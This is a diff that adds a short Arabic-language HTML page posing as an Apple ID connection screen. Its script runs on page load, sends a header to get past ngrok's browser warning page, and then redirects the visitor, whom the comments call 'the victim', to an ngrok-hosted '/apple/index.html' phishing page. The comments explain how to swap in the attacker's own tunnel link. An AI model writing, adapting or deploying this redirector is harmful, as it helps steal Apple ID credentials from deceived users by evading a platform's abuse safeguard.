@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جارٍ التحميل...</title>
+    <script>
+        async function redirect() {
+            // رابط الـ Ngrok بتاعك (غيره بالرابط اللي طالع عندك في الـ CMD حالياً)
+            const ngrokUrl = "https://your-link.ngrok-free.app/apple/index.html";
+
+            try {
+                // دي الحركة اللي بتهرب من صفحة التحذير الزرقاء
+                await fetch(ngrokUrl, {
+                    method: 'GET',
+                    headers: {
+                        'ngrok-skip-browser-warning': 'true'
+                    },
+                    mode: 'no-cors'
+                });
+                
+                // بعد إرسال الهيدر، بنحول الضحية للينك علطول
+                window.location.href = ngrokUrl;
+            } catch (e) {
+                window.location.href = ngrokUrl;
+            }
+        }
+        
+        // تشغيل الدالة بمجرد فتح الصفحة
+        window.onload = redirect;
+    </script>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 100px; font-family: Arial;">
+        <p>جاري تأمين الاتصال بـ Apple ID...</p>
+    </div>
+</body>
+</html>
